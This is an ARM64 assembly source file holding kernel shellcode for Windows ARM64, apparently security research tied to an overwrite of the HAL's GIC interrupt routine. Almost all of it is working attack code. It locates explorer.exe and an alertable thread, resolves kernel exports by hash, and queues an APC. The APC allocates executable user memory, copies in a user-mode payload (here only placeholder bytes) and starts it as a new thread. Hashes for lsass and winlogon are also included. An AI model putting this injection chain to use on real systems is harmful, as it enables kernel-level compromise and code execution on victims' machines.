;
; Copyright (c) Matt Suiche. All rights reserved.
;
; Module Name :
;
;   kernel.asm
;
; Description:
;
;   GIC Shellcode for Windows ARM64 hal!HalpGic3RequestInterrupt overwrite
;
; Author:
;
;   Matt Suiche (@msuiche) 20-June-2020 - Initial Implementation
;
; Environment:
;
;   Kernel-land
;


OFFSET_PE_HDR        EQU 0x3C

KPCR_CURRENTTHREAD_OFFSET EQU 0x988

EPROCESS_IMAGEFILENAME_OFFSET EQU 0x408
EPROCESS_PROCESSLIST_FLINK_OFFSET EQU 0x2a8
EPROCESS_PEB_OFFSET EQU 0x3b0
EPROCESS_THREADLIST_FLINK_OFFSET EQU 0x38
EPROCESS_THREADLIST_BLINK_OFFSET EQU 0x40

ETHREAD_PROCESS_OFFSET EQU 0xB0
ETHREAD_THREADLIST_FLINK_OFFSET EQU 0x318
ETHREAD_THREADLIST_BLINK_OFFSET EQU 0x320
ETHREAD_FLAGS_OFFSET EQU 0x6C ; MiscFlags->Alertable

ETHREAD_FLAGS_ALERTABLE EQU 0x10

USERMODE_SHELLCODE_SIZE EQU 0x100

S_FRAME_SIZE EQU 0x120

    AREA KERNEL, CODE, READONLY

;    EXPORT PsGetCurrentProcess
;
; PsGetCurrentProcess PROC
;    ldr x8, [xpr, #0x988]; PsGetCurrentThread()
;    ldr x0, [x8, #0xB0] ; PsGetCurrentProcess()
;    ret
;    ENDP

    EXPORT KernelShellcode

KernelShellcode PROC

    ; Some notes
    ; mrs x0, TTBR0_EL1 ; Directory Table Base
    ; mrs x0, #0, c2, c0, #0
    ; xpr points to KPCR
    ; ldr x8, [xpr, #0x988]; PsGetCurrentThread()
    ; ldr x0, [x8, #0xB0] ; PsGetCurrentProcess()
    ; add x0, x0, #0x408 ; PsGetProcessImageFileName()
    ; ldr x0, [x0, #0x2A0] ; PsGetProcessId()
    ; ldr x0, [x0, #0x2A8] ; Get Next EPROCESS
    ; ldr x0, [x0, #0x3B0] ; PsGetProcessPeb()

    sub    sp, sp, #S_FRAME_SIZE
    stp    x0, x1, [sp, #16 * 0]
    stp    x2, x3, [sp, #16 * 1]
    stp    x4, x5, [sp, #16 * 2]
    stp    x6, x7, [sp, #16 * 3]
    stp    x8, x9, [sp, #16 * 4]
    stp    x10, x11, [sp, #16 * 5]
    stp    x12, x13, [sp, #16 * 6]
    stp    x14, x15, [sp, #16 * 7]
    stp    x16, x17, [sp, #16 * 8]
    stp    xpr, x19, [sp, #16 * 9]
    stp    x20, x21, [sp, #16 * 10]
    stp    x22, x23, [sp, #16 * 11]
    stp    x24, x25, [sp, #16 * 12]
    stp    x26, x27, [sp, #16 * 13]
    stp    x28, x29, [sp, #16 * 14]
    str    lr, [sp, #16 * 15]

    ; *m_pHalpGic3RequestInterrupt = m_HalpGic3RequestInterrupt;
    adr     x19, OKLM_TABLE_BASE
    ldp     x9, x8, [x19]
    str     x8, [x9]

    ;msr     DAIFClr, #2             ; enable interrupts
    ;brk     #0xF000

    ldr     x8, [xpr, #0x988]; PsGetCurrentThread()
    ldr     x3, [x8, #ETHREAD_PROCESS_OFFSET] ; PsGetCurrentProcess()
    add     x0, x3, #EPROCESS_IMAGEFILENAME_OFFSET ; name
    bl      xxxComputeHash ; ComputeHash(char const *)
    ldr     w11, EXPLORER_HASH
    ; ldr     w12, WINLOGON_HASH
    b       xxx_find_process

xxx_loop_find_process
    ldr     x3, [x3,#EPROCESS_PROCESSLIST_FLINK_OFFSET]
    sub     x3, x3, EPROCESS_PROCESSLIST_FLINK_OFFSET
    add     x0, x3, #EPROCESS_IMAGEFILENAME_OFFSET
    bl      xxxComputeHash ; ComputeHash(char const *)

xxx_find_process
    ; cmp     w0, w12
    ; beq     xxx_process_found
    cmp     w0, w11
    bne     xxx_loop_find_process

xxx_process_found
    str     x3, [x19, #m_ProcessObject - OKLM_TABLE_BASE]

    ldr     x9, [x3, #EPROCESS_THREADLIST_FLINK_OFFSET]
    ldr     x8, [x3, #EPROCESS_THREADLIST_BLINK_OFFSET]
    sub     x10, x8, #ETHREAD_THREADLIST_FLINK_OFFSET
    sub     x20, x9, #ETHREAD_THREADLIST_FLINK_OFFSET
    b       xxx_init_thead_loop

xxx_next_thread
    ldr     w8, [x20,#ETHREAD_FLAGS_OFFSET]
    and     w8, w8, #ETHREAD_FLAGS_ALERTABLE
    cbnz    w8, xxx_thread_found ; Is Thread alertable?
    ldr     x9, [x20,#ETHREAD_THREADLIST_FLINK_OFFSET]
    sub     x20, x9, #ETHREAD_THREADLIST_FLINK_OFFSET

xxx_init_thead_loop
    cmp     x10, x20
    bne     xxx_next_thread ; ETHREAD_FLAGS_OFFSET
    b       xxx_no_thread_found

xxx_thread_found
    str     x20, [x19, #m_AlertableThreadObject - OKLM_TABLE_BASE] ; m_AlertableThreadObject

    ; Search for NTBase
    mrs     x4, VBAR_EL1
    ldrh    w8, [x4]
    mov     w9, #0x5A4D
    cmp     w8, w9
    beq     xxx_break_nt_base

xxx_loop_nt_base
    sub     x4, x4, #1, lsl#12
    ldrh    w8, [x4]
    cmp     w8, w9
    bne     xxx_loop_nt_base

xxx_break_nt_base
    str     x4, [x19, #m_NtBase - OKLM_TABLE_BASE] ; g_Data.m_NtBase = FindNtBase()

    ldr     w1, RtlCreateUserThread_HASH
    mov     x0, x4  ; _base
    bl      xxxGetProcAddr
    str     x0, [x19, #m_RtlCreateUserThread - OKLM_TABLE_BASE]

    ldr     w1, KeStackAttachProcess_HASH 
    mov     x0, x4  ; _base
    bl      xxxGetProcAddr
    str     x0, [x19, #m_KeStackAttachProcess - OKLM_TABLE_BASE]

    ldr     w1, KeUnstackDetachProcess_HASH
    mov     x0, x4 ; _base
    bl      xxxGetProcAddr
    str     x0, [x19, #m_KeUnstackDetachProcess - OKLM_TABLE_BASE]

    ldr     w1, ZwAllocateVirtualMemory_HASH
    mov     x0, x4  ; _base
    bl      xxxGetProcAddr
    str     x0, [x19, #m_ZwAllocateVirtualMemory - OKLM_TABLE_BASE]

    ldr     w1, KeInitializeApc_HASH
    mov     x0, x4  ; _base
    bl      xxxGetProcAddr
    str     x0, [x19, #m_KeInitializeApc - OKLM_TABLE_BASE]

    ldr     w1, KeInsertQueueApc_HASH
    mov     x0, x4  ; _base
    bl      xxxGetProcAddr
    str     x0, [x19, #m_KeInsertQueueApc - OKLM_TABLE_BASE]
    
    ldr     x4, m_HalpGic3RequestInterrupt
    and     x4, x4, #0xFFFFFFFFFFFFF000
    ldrh    w8, [x4]
    mov     w9, #0x5A4D
    cmp     w8, w9
    beq     xxx_break_hal_base

xxx_loop_hal_base
    sub     x4, x4, #1, lsl#12
    ldrh    w8, [x4]
    cmp     w8, w9
    bne     xxx_loop_hal_base

xxx_break_hal_base
    str     x4, [x19, #m_HalBase - OKLM_TABLE_BASE]

    ldr     w1, KfRaiseIrql_HASH
    mov     x0, x4  ; _base
    bl      xxxGetProcAddr
    str     x0, [x19, #m_KfRaiseIrql - OKLM_TABLE_BASE]

    ldr     w1, KfLowerIrql_HASH
    mov     x0, x4  ; _base
    bl      xxxGetProcAddr
    str     x0, [x19, #m_KfLowerIrql - OKLM_TABLE_BASE]

    ldr     x8, [x19, #m_KeInitializeApc - OKLM_TABLE_BASE]
    adr     x3, KernelApcRoutine
    mov     x7, #0
    add     x0, x19, #m_KAPC - OKLM_TABLE_BASE ; APC1
    mov     W6, #0
    mov     X5, #0
    mov     x4, #0
    mov     W2, #0
    ldr     x1, [x19, #m_AlertableThreadObject - OKLM_TABLE_BASE] ; m_AlertableThreadObject
    blr     x8

    ldr     x8, [x19, #m_KeInsertQueueApc - OKLM_TABLE_BASE]
    mov     W3, #0
    mov     x2, #0
    mov     X1, #0
    add     x0, x19, #m_KAPC - OKLM_TABLE_BASE ; APC1
    blr     x8

xxx_no_thread_found
    ldp    x0, x1, [sp, #16 * 0]
    ldp    x2, x3, [sp, #16 * 1]
    ldp    x4, x5, [sp, #16 * 2]
    ldp    x6, x7, [sp, #16 * 3]
    ldp    x8, x9, [sp, #16 * 4]
    ldp    x10, x11, [sp, #16 * 5]
    ldp    x12, x13, [sp, #16 * 6]
    ldp    x14, x15, [sp, #16 * 7]
    ldp    x16, x17, [sp, #16 * 8]
    ldp    xpr, x19, [sp, #16 * 9]
    ldp    x20, x21, [sp, #16 * 10]
    ldp    x22, x23, [sp, #16 * 11]
    ldp    x24, x25, [sp, #16 * 12]
    ldp    x26, x27, [sp, #16 * 13]
    ldp    x28, x29, [sp, #16 * 14]
    ldr    lr, [sp, #16 * 15]
    add    sp, sp, #S_FRAME_SIZE

    ;msr     DAIFSet, #2             ; disable interrupts

    ; Continue the GIC Request Call
    ldr     x8, m_HalpGic3RequestInterrupt
    br      x8
    ret
    ENDP

KernelApcRoutine PROC

    stp     x19, x20, [sp,#-0x20]!
    str     x21, [sp,#0x10]
    stp     x29, x30, [sp,#-0x10]!
    mov     x29, sp
    sub     sp, sp, #0x10

    ; msr     DAIFClr, #2             ; enable interrupts
    ; brk     #0xF000

    adr     x19, OKLM_TABLE_BASE

    ldrb    w0, [X18, #0x38]
    strb    w0, [x19, #m_CurrentIrql - OKLM_TABLE_BASE] ; Save m_CurrentIrql

    ldr     x8, [x19, #m_KfLowerIrql - OKLM_TABLE_BASE]
    mov     x0, #0 ; PASSIVE_LEVEL
    blr     x8  ; KfLowerIrql_HASH

    add     X1, x19, #m_KAPC - OKLM_TABLE_BASE
    ldr     x0, [x19, #m_ProcessObject - OKLM_TABLE_BASE] ; EPROCESS
    ldr     x8, [x19, #m_KeStackAttachProcess - OKLM_TABLE_BASE]
    blr     x8 ; KeStackAttachProcess

    mov     x8, #0x1000
    stp     xzr, x8, [x19, #m_UserAddress - OKLM_TABLE_BASE]
    ldr     x8, [x19, #m_ZwAllocateVirtualMemory - OKLM_TABLE_BASE]
    mov     w5, #0x40 ; PAGE_EXECUTE_READWRITE 
    mov     w4, #0x1000 ; MEM_COMMIT
    add     x3, x19, #m_UserModePayloadSize - OKLM_TABLE_BASE
    mov     x2, #0
    add     X1, x19, #m_UserAddress - OKLM_TABLE_BASE
    mov     x0, #0xFFFFFFFFFFFFFFFF ; GetCurrentProcessHandle()
    blr     x8 ; ZwAllocateVirtualMemory

    cbnz    w0, xxx_memalloc_failed
    adr     x10, xxxUserModeShellcode
    ldr     x11, [x19, #m_UserAddress - OKLM_TABLE_BASE]
    add     x12, x10, #0x100 ; Approximate shellcode size to be copied

xxx_memcpy
    ldp     x8, x9, [x10],#0x10
    stp     x8, x9, [x11],#0x10
    cmp     x10, x12
    bne     xxx_memcpy

    add     x8, x19, #m_ClientId - OKLM_TABLE_BASE
    str     x8, [sp,#8]
    ldr     x6, [x19, #m_UserAddress - OKLM_TABLE_BASE]
    ldr     x8, [x19, #m_RtlCreateUserThread - OKLM_TABLE_BASE]
    add     x9, x19, #m_hThread - OKLM_TABLE_BASE
    mov     x7, #0
    str     x9, [sp]
    mov     X5, #0
    mov     x4, #0
    mov     W3, #0
    mov     W2, #0
    mov     X1, #0
    mov     x0, #0xFFFFFFFFFFFFFFFF
    blr     x8  ; RtlCreateUserThread

xxx_memalloc_failed
    ldr     x8, [x19, #m_KeUnstackDetachProcess - OKLM_TABLE_BASE]
    add     x0, x19, #m_KAPC - OKLM_TABLE_BASE
    blr     x8 ; KeUnstackDetachProcess

    ldrb    w0, [x19, #m_CurrentIrql - OKLM_TABLE_BASE]
    ldr     x8, [x19,  #m_KfRaiseIrql - OKLM_TABLE_BASE]
    blr     x8 ; KfRaiseIrql

    ; msr     DAIFSet, #2             ; disable interrupts

    add     sp, sp, #0x10
    ldp     x29, x30, [sp],#0x10
    ldr     x21, [sp,#0x10]
    ldp     x19, x20, [sp],#0x20
    ret

    ENDP

xxxComputeHash PROC
    mov     x9, x0
    ldrsb           w8, [x9]
    mov     w0, #0
    mov     w10, #0
    cbz     w8, xxx_compute_hash_exit

xxx_compute_hash_loop
    add     w10, w10, #1
    crc32b          w0, w0, w8
    ldrsb           w8, [x9,w10,sxtw]
    cbnz    w8, xxx_compute_hash_loop

xxx_compute_hash_exit
    ret
    ENDP

xxxGetProcAddr PROC
    stp     x29, x30, [sp,#-0x10]!
    mov     x29, sp
    mov     x14, x0
    ldr     w8, [x14,#OFFSET_PE_HDR]
    mov     w13, #0
    add     x9, x14, w8,uxtw
    ldr     w10, [x9,#0x88]
    add     x11, x14, w10,uxtw
    ldp     w12, w8, [x11,#0x20]
    ldr     w9, [x11,#0x1C]
    add     x15, x14, w8, uxtw
    ldr     w8, [x14, w12, uxtw]
    add     x6, x14, w12, uxtw
    add     x7, x14, w9, uxtw
    b       xxx_proc_loop_start

xxx_loop_name_crc
    add     w13, w13, #1
    ldr     w8, [x6, w13, sxtw#2]

xxx_proc_loop_start
    add     x0, x14, w8,uxtw
    bl      xxxComputeHash
    cmp     w0, w1
    bne     xxx_loop_name_crc
    ldrh    w8, [x15, w13, sxtw#1]
    ldr     w8, [x7,x8, lsl#2]
    add     x0, x14, w8,uxtw
    ldp     x29, x30, [sp],#0x10
    ret

    ENDP

EXPLORER_HASH DCD 0xc5d6b63a
SPOOLSV_HASH DCD 0x7865B676
WINLOGON_HASH DCD 0x42878585
LSASS_HASH DCD 0x5242f10d
RtlCreateUserThread_HASH DCD 0x88DAD34E
KeStackAttachProcess_HASH DCD 0xB9B2F787
KeUnstackDetachProcess_HASH DCD 0x99D061D2
ZwAllocateVirtualMemory_HASH DCD 0xAA808130
KeInitializeApc_HASH DCD 0x891b2ba8
KeInsertQueueApc_HASH DCD 0xfbb10222
KfLowerIrql_HASH DCD 0x2950a536
KfRaiseIrql_HASH DCD 0x68766360

OKLM_TABLE_BASE
m_pHalpGic3RequestInterrupt DCQ 0x4242424242424242
m_HalpGic3RequestInterrupt DCQ 0x4242424242424242
m_HalBase DCQ 0
m_NtBase DCQ 0
m_ProcessObject DCQ 0
m_ZwAllocateVirtualMemory DCQ 0
m_KeStackAttachProcess DCQ 0
m_KeUnstackDetachProcess DCQ 0
m_RtlCreateUserThread DCQ 0
m_KeInitializeApc DCQ 0
m_KeInsertQueueApc DCQ 0
m_KfLowerIrql DCQ 0
m_KfRaiseIrql DCQ 0

m_KAPC SPACE 0x60

m_UserAddress DCQ 0
m_UserModePayloadSize DCQ 0
m_hThread DCQ 0
m_ClientId DCQ 0, 0
m_CurrentIrql DCQ 0
m_AlertableThreadObject DCQ 0
OKLM_TABLE_LIMIT

xxxUserModeShellcode PROC 
    DCD 0x41414141, 0x41414141, 0x41414141, 0x41414141, 0x41414141 
    ENDP

    END